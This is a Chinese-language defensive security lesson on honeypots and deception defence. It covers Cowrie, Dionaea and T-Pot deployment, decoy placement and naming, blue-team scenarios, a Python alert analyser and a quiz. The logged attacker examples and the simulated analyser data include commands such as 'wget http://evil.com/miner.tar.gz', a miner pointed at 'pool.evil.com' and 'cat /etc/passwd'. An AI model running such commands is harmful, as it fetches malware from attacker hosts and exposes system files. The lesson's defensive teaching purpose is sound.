# Day 12：欺骗防御与蜜罐技术
## 在家里放一些假珠宝，让小偷白忙活

---

> 🎯 **今日目标**  
> 理解蜜罐部署策略 · 掌握蜜罐溯源技术 · 学习欺骗防御架构

---

## 📖 一、蜜罐是什么？——给小偷准备的"假金库"

想象你在森林里有一间木屋，经常有小偷光顾。你很聪明，在屋子外面放了一个**假的宝箱**：

```
📦 假宝箱里：
  - 假珠宝（不值钱的玻璃珠）
  - 一个隐藏摄像头 📷
  - 一个GPS追踪器 📍
  - 一个报警器 🚨

结果：
  小偷打开宝箱 → 触发警报 → 被摄像头拍下 → GPS追踪去向
```

**这就是蜜罐（Honeypot）！** 在网络世界里，蜜罐就是一个故意放出来的"诱饵服务器"，看起来很脆弱、很有价值，但其实：

- ✅ 上面没有真实数据
- ✅ 访问者的一举一动都被记录
- ✅ 任何访问都高度可疑（因为正常人不该碰它）

---

## 📖 二、蜜罐的三大无敌优势

### 🎯 优势1：告警质量极高

```
传统IDS：       一天1万条告警 → 9900条是误报
蜜罐：          一天3条告警 → 3条都是真实攻击

为什么？因为蜜罐上没有任何正常业务，
访问它的只可能是：黑客、扫描器、或者走错路的管理员
→ 管理员走错路的概率极低
→ 所以蜜罐的告警几乎100%是真实攻击！
```

### 🎯 优势2：捕获完整的攻击行为

```
高交互蜜罐（真实操作系统）能记录：
  ✅ 攻击者输入了什么命令
  ✅ 攻击者下载了什么工具
  ✅ 攻击者修改了什么文件
  ✅ 攻击者的IP和时区
  ✅ 攻击者的键盘输入习惯

→ 这些信息对溯源来说是无价之宝！
```

### 🎯 优势3：给蓝队争取时间

```
攻击者在蜜罐里"忙活"了2小时
  → 以为自己攻破了一台重要服务器
  → 实际上是在假服务器上白费功夫
  → 蓝队利用这2小时加固了真实的服务器
```

---

## 📖 三、蜜罐的类型

| 类型 | 复杂度 | 交互深度 | 例子 | 像什么？ |
|------|--------|----------|------|----------|
| **低交互蜜罐** | ⭐ | 只模拟端口/服务 banner | Honeyd | 纸板假人保安 |
| **中交互蜜罐** | ⭐⭐⭐ | 模拟服务的简单交互 | Cowrie(SSH), Dionaea(恶意软件) | 充气假人保安 |
| **高交互蜜罐** | ⭐⭐⭐⭐⭐ | 真实操作系统和服务 | 真实的Windows/Linux | 真人便衣保安 |

### 🐄 Cowrie——最流行的SSH/Telnet蜜罐

```
部署Cowrie后，攻击者尝试SSH登录你的蜜罐：
  
攻击者 → ssh root@蜜罐IP
蜜罐(假) → 欢迎登录！（密码随便输都会"接受"）
攻击者 → uname -a、cat /etc/passwd、wget 恶意软件...
蜜罐 → 全部记录！

Cowrie还能：
  ✅ 记录攻击者下载的所有文件
  ✅ 回放攻击者的操作（像放电影一样）
  ✅ 用JSON格式输出便于导入SIEM
```

### 🪤 Dionaea——恶意软件捕获蜜罐

```
Dionaea模拟各种有漏洞的服务：
  - SMB（Windows文件共享）
  - FTP、HTTP、MySQL、SIP...

攻击者扫描到你 → 发现"漏洞" → 上传恶意软件
  → Dionaea接受恶意软件 → 保存样本 → 发送到分析平台

整个过程中，攻击者不知道自己在上传给一个"假的"服务器！
```

---

## 📖 四、蜜罐放哪里？——护网部署策略

### 🗺️ 部署蓝图

```
                ┌─────────────┐
  互联网 ────── │  防火墙/WAF  │ ───── DMZ ───── 蜜罐①
                └──────┬──────┘          (Web蜜罐)
                       │
              ┌────────┴────────┐
              │   核心交换机     │
              └────────┬────────┘
         ┌─────────────┼─────────────┐
    生产服务器区    数据库区    蜜罐②(内网)
                              SRV-ADMIN-01 ← 名字像域控
                              SRV-FINANCE-01 ← 名字像财务系统
```

### 📍 三个最佳位置

```
① 外网DMZ蜜罐：
   目的：收集互联网攻击情报
   放什么：Web蜜罐、SSH蜜罐
   
② 内网核心区蜜罐：
   目的：检测已突破边界的攻击者
   放什么：假域控、假财务系统、假数据库
   名字要像真的一样：SRV-AD-01, FINANCE-DB, HR-PORTAL

③ 工控区蜜罐（如果有）：
   目的：保护工控系统
   放什么：Conpot工控蜜罐
```

### 🎭 蜜罐起名艺术

```
❌ 差的名字：
  honeypot-01、deception-server → 一看就假

✅ 好的名字：
  SRV-EXCHANGE-01、PAYMENT-GW、CORP-FILE-01
  → 和真实服务器命名风格一致，以假乱真
```

---

## 📖 五、护网中的蜜罐实战

### 🎯 场景1：SSH蜜罐捕获暴力破解

```
Day1 凌晨 02:15
  Cowrie蜜罐告警：IP 45.33.32.156 正在暴力破解SSH
  
  Cowrie记录：
  - 尝试用户：root, admin, test, oracle
  - 尝试密码：admin123, password, root123...
  - 最终"成功"登录（蜜罐让它"成功"的）
  - 登录后执行：uname -a, wget http://evil.com/miner.tar.gz
  
→ 蓝队行动：
  1. 立即封禁 45.33.32.156
  2. 分析 miner.tar.gz → 发现是挖矿木马
  3. 将IP+样本IOC共享给兄弟单位
  4. 确认蜜罐日志完整性
```

### 🎯 场景2：假数据库诱捕数据窃取

```
Day5 14:30
  假MySQL蜜罐告警：来自内网IP 10.0.0.99 的异常查询
  
  日志显示：
  SELECT * FROM users;
  SELECT * FROM credit_cards;
  SELECT * FROM salaries;
  
→ 发现：
  - 10.0.0.99 是昨天被钓鱼成功的HR电脑
  - 攻击者已在内网横向移动
  - 正在寻找敏感数据
  
→ 蓝队行动：
  立即隔离10.0.0.99 → 启动PDCERF应急响应
  蜜罐成功预警了内网入侵！
```

---

## 📖 六、T-Pot——白菜价的蜜罐全家桶

T-Pot是德国电信开源的多蜜罐集成平台，一个Docker命令部署16种蜜罐：

```
T-Pot包含的蜜罐：
  🐄 Cowrie        — SSH/Telnet蜜罐
  🪤 Dionaea       — 恶意软件捕获
  🏭 Conpot        — 工控蜜罐
  🕸️ Elasticpot    — Elasticsearch蜜罐
  📧 Mailoney      — 邮件蜜罐
  🌐 Honeytrap     — 智能响应蜜罐
  🐙 Glutton       — 万能蜜罐（什么协议都回应）
  ...还有9种！

部署命令（简单到令人发指）：
  git clone https://github.com/telekom-security/tpotce
  cd tpotce && sudo ./install.sh --type=user
```

---

## 💻 七、动手试试：蜜罐告警分析器

```python
# 蜜罐告警自动分析系统
from collections import defaultdict

class HoneypotAnalyzer:
    def __init__(self):
        self.events = []
    
    def add_event(self, ip, service, action, payload=''):
        """记录蜜罐捕获的事件"""
        self.events.append({
            'ip': ip,
            'service': service,
            'action': action,
            'payload': payload
        })
    
    def analyze(self):
        """分析攻击者行为"""
        # 按IP聚合攻击活动
        ip_activities = defaultdict(list)
        for event in self.events:
            ip_activities[event['ip']].append(event)
        
        print('=== 🍯 蜜罐告警分析报告 ===\n')
        
        for ip, activities in ip_activities.items():
            num_activities = len(activities)
            services_used = set(a['service'] for a in activities)
            has_malware = any('wget' in a.get('payload', '') or 
                            'curl' in a.get('payload', '') 
                            for a in activities)
            
            # 攻击者活跃度评估
            if num_activities >= 5 and has_malware:
                level = '🔴 高活跃攻击者 (尝试下载恶意软件!)'
            elif num_activities >= 3:
                level = '🟠 活跃攻击者'
            else:
                level = '🟡 低活跃探测'
            
            print(f'[攻击者] {ip}  →  {level}')
            print(f'  使用服务: {", ".join(services_used)}')
            print(f'  活动次数: {num_activities}')
            
            # 展示具体行为
            for act in activities:
                icon = {'ssh': '🔑', 'mysql': '🗄️', 'rdp': '🖥️',
                        'http': '🌐', 'ftp': '📁'}.get(act['service'], '🔧')
                print(f'  {icon} [{act["service"]}] {act["action"]}')
                if act['payload']:
                    print(f'     Payload: {act["payload"][:80]}...' 
                          if len(act['payload']) > 80 
                          else f'     Payload: {act["payload"]}')
            print()

# === 模拟蜜罐一天的数据 ===
analyzer = HoneypotAnalyzer()

# 攻击者A：暴力破解+尝试下载挖矿程序
analyzer.add_event('45.33.32.156', 'ssh', '登录尝试', 'root/admin123')
analyzer.add_event('45.33.32.156', 'ssh', '执行命令', 'wget http://evil.com/miner.tar.gz')
analyzer.add_event('45.33.32.156', 'ssh', '执行命令', 'tar -xzf miner.tar.gz')
analyzer.add_event('45.33.32.156', 'ssh', '执行命令', './miner --pool pool.evil.com')
analyzer.add_event('45.33.32.156', 'mysql', '数据查询', 'SELECT * FROM users')

# 攻击者B：简单的端口扫描探测
analyzer.add_event('103.224.182.250', 'http', '扫描探测', 'GET /wp-admin')
analyzer.add_event('103.224.182.250', 'http', '扫描探测', 'GET /admin')

analyzer.analyze()
```

---

## 🧪 八、今日实验：部署蜜罐全家桶

### 实验目标
在内网部署Cowrie SSH蜜罐和Dionaea恶意软件蜜罐

### 实验步骤

```
1️⃣ 部署Cowrie SSH蜜罐
   docker pull cowrie/cowrie
   docker run -d -p 2222:2222 cowrie/cowrie

2️⃣ 配置Cowrie
   - 设置虚假的文件系统（让它看起来像真实服务器）
   - 配置告警通知（告警发到SIEM/邮件）
   - 设置"假"的有价值文件

3️⃣ 模拟攻击者访问蜜罐
   ssh root@localhost -p 2222
   密码：随便输 → 蜜罐会"接受"！
   然后试试：ls, cat /etc/passwd, wget ...

4️⃣ 查看Cowrie日志
   cat cowrie/log/cowrie.json
   → 看到你刚才的操作全被记录了！

5️⃣ 部署Dionaea捕获恶意软件样本
   docker run -d --name dionaea -p 21:21 -p 445:445 dinotools/dionaea
```

---

## 📝 九、今日测验

**Q1：蜜罐告警相比传统IDS最大的优势是什么？**
- A. 告警数量多
- B. 误报率极低，几乎每条都是真实攻击  ✅
- C. 部署更简单
- D. 免费

> 蜜罐没有正常业务流量，任何访问都高度可疑。IDS一天可能产生大量误报。

**Q2：Cowrie是什么类型的蜜罐？**
- A. Web蜜罐
- B. SSH/Telnet蜜罐  ✅
- C. 数据库蜜罐
- D. 工控蜜罐

> Cowrie模拟SSH/Telnet服务，记录攻击者的登录尝试和命令执行。

**Q3：高交互蜜罐最大的优点是什么？**
- A. 部署简单
- B. 能捕获完整的攻击行为和恶意样本  ✅
- C. 成本低
- D. 风险小

> 高交互蜜罐运行真实系统，攻击者交互越深入，捕获的信息越有价值。

**Q4：T-Pot是什么？**
- A. 单一蜜罐
- B. 包含16+种蜜罐的集成平台  ✅
- C. IDS设备
- D. 防火墙

> T-Pot是蜜罐全家桶，一个命令部署Cowrie/Dionaea/Conpot/Elasticpot等16种蜜罐。

**Q5：护网中蜜罐应该部署在哪里？**
- A. 只放外网
- B. 内网核心区域（模拟关键资产）  ✅
- C. 只放DMZ
- D. 随便放

> 蜜罐的重点是检测已突破边界的攻击者，所以在内网核心区域模拟域控、财务系统等关键资产效果最好。

---

## 📚 十、课后资源

| 资源 | 链接 | 说明 |
|------|------|------|
| T-Pot蜜罐平台 | github.com/telekom-security/tpotce | 蜜罐全家桶 |
| Cowrie文档 | github.com/cowrie/cowrie | SSH蜜罐 |
| 欺骗防御白皮书 | 各大安全厂商官网 | 深入了解Deception |

---

## 🧠 十一、专家锦囊

> **赵安全说：** 护网中部署蜜罐效果显著：①蜜罐告警几乎不需要研判（肯定有问题）②能收集攻击者的工具和样本 ③能拖延攻击者时间 ④能给溯源提供重要线索。建议每个护网单位至少部署5-10个内网蜜罐。

> **钱运维说：** 蜜罐部署不要"见光死"。要点：①蜜罐名字要像真实资产（SRV-FINANCE-DB）②蜜罐不要过于"完美"（适当留些"漏洞"诱惑攻击者）③蜜罐之间用蜜网串联 ④定期更换蜜罐特征 ⑤和真实业务严格隔离防止被跳板利用。

---

📅 **Day 12 完成！** 今天你学会了用蜜罐"请君入瓮"——让攻击者在假目标上白费功夫，同时被全程录像！
